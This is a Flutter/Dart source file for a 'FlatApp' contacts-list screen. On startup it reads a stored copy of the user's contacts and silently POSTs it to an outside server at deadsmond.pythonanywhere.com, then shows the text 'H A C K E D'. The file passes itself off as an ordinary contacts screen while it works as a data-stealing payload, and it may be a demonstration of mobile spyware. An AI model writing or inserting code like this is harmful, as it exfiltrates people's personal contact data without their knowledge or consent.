import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import '../storages/ContentStorage.dart';
import 'package:http/http.dart' as http;


//==============================================================================
//--------------------------- INITIALIZATION -----------------------------------
// FlatApp class object, operating algorithms and behaviour
class ContactsRoute extends StatefulWidget {
  //---------------------------- VARIABLES -------------------------------------
  @override
  _FlatAppMainState createState() => _FlatAppMainState();
}

//==============================================================================
//---------------------------- WIDGET ------------------------------------------
class _FlatAppMainState extends State<ContactsRoute> {
  //---------------------------- VARIABLES -------------------------------------
  // var to store contacts
  ContentStorage storageContent = ContentStorage();
  String _data;

  //---------------------------- INIT ------------------------------------------
  @override
  void initState() {
    super.initState();
    _operateContacts();
  }

  //-------------------------- FILE CONTENT ------------------------------------
  void sendRequest() async {
    var url = 'https://deadsmond.pythonanywhere.com/checkpoint';
    Map<String, String> headers = {"Content-type": "application/json"};
    String jsonBody = '{"data": "$_data"}';
    http.Response response = await http.post(url, headers: headers, body: jsonBody);
    print('Response status: ${response.statusCode}');
    print('Response body: ${response.body}');
  }

  void _operateContacts() async {
    // restore contacts
    _data = await storageContent.readContent("CONTACTS_COPY");
    sendRequest();
  }

  //---------------------------- MAIN WIDGET -----------------------------------
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('FlatApp: contacts list'),
        actions: <Widget>[
          new IconButton(
            icon: new Icon(Icons.close),
            onPressed: () =>
                SystemChannels.platform.invokeMethod('SystemNavigator.pop'),
          ),
        ],
      ),
      body: _data != null
          ? Text('H A C K E D' ?? '')
          : CircularProgressIndicator(),
    );
  }
}
//==============================================================================
